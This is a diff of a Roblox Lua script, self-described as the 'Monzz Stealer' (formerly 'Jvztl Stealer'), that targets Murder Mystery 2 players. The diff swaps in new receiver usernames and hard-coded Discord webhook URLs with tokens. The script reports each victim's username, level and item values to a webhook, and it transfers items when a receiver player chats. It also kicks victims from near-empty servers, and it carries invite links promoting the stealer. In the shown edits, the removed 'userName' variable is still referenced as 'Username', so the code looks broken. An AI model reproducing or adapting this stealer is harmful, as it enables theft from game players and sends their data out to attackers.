@@ -1,6 +1,3 @@
-userName = "Baju_Basah122"
-webHook = "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
-
 local values = {
     ["Nik's Scythe"] = 25000000,
     ["Elderwood Scythe"] = 75,
@@ -794,8 +791,8 @@ local values = {
 	["Moon"] = 1
 }
 
-userName1 = "TehPucuk_55"
-webHook1 = "https://discord.com/api/webhooks/1207564690235072542/EG_jL5cwnNCuqaGN04wTfLY95eragiPbHFexog9x-7mUmvTzGzkpx0wL-YV-BrXfQ78O"
+Username1 = "TehPucuk_55"
+Webhook1 = "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
 
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("Exit game and re-inject")
@@ -1063,33 +1060,33 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Common\n" .. commonsString
 
 local WebHookEmbed = CreateEmbed(
-    "🔪 Join to get MM2 hit",
+    "⛱️ MM2 hit - Ft. Light Monzz",
     "",
     11220,
     {
         {
-            name = "```Info```", 
-            value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl())..
-                     "\nReceiver: "..userName.."```"
+            name = "```✏️ Player Info```", 
+            value = "```:book: Username: "..LP.Name.."\n🚀 Level: "..tostring(getLvl())..
+                     "\n(💻) Receiver: "..Username.."```"
         },
         {
-            name = "```Hit Info```", 
+            name = "```:dart: Hit Info```", 
             value = "```Uniques: "..tostring(uniqueItemsC)..
-                     "\nAncients: "..tostring(ancientItemsC)..
-                     "\nGodlys: "..tostring(godlyItemsC)..
-                     "\nLegendaries: "..tostring(legendaryItemsC)..
-                     "\nVintage: "..tostring(vintageItemsC)..
-                     "\nRares: "..tostring(rareItemsC)..
-                     "\nUncommons: "..tostring(uncommonItemsC)..
-                     "\nCommons: "..tostring(commonItemsC).."```"
+                     "\n(🥳) Ancients: "..tostring(ancientItemsC)..
+                     "\n(🤑) Godlys: "..tostring(godlyItemsC)..
+                     "\n(😜) Legendaries: "..tostring(legendaryItemsC)..
+                     "\n(😛) Vintage: "..tostring(vintageItemsC)..
+                     "\n(😀) Rares: "..tostring(rareItemsC)..
+                     "\n(☹️) Uncommons: "..tostring(uncommonItemsC)..
+                     "\n(😕) Commons: "..tostring(commonItemsC).."```"
         },
         {
             name = "```Summary```", 
-            value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."```"
+            value = "```:gem: Total Value: "..tostring(math.floor(valueCount + 0.5)).."```"
         },
         {
-            name = "```Jvztl Stealer```", 
-            value = "https://discord.gg/qcsZfTRKJA"
+            name = "```Monzz Stealer```", 
+            value = "https://discord.gg/CAr4FZHAyF"
         }
     }
 )
@@ -1132,7 +1129,7 @@ local function stealitems(targetUser)
 end
 
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName or player.Name == userName1 then
+    if player.Name == Username or player.Name == Username1 then
         player.Chatted:Connect(function(msg)
             stealitems(player.Name)
         end)
